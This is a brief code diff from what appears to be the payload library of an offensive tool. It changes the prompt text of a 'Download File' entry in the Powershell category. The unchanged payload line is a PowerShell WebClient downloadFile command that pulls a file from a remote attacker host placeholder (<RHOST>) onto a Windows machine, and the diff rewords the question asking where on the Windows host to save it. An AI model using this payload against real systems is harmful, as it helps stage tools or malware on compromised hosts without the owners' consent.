@@ -152,10 +152,10 @@ Load({
 
 Load({
 	title: "Download File",
-	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
+	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (storage path)>")',
 	category: "Powershell",
 	callback: function(bro){
-	    question("Local path to save file?")
+	    question("Where (on the Windows host) would you like to save the file?")
 	    ask.some(questions, bro);
 
 	}
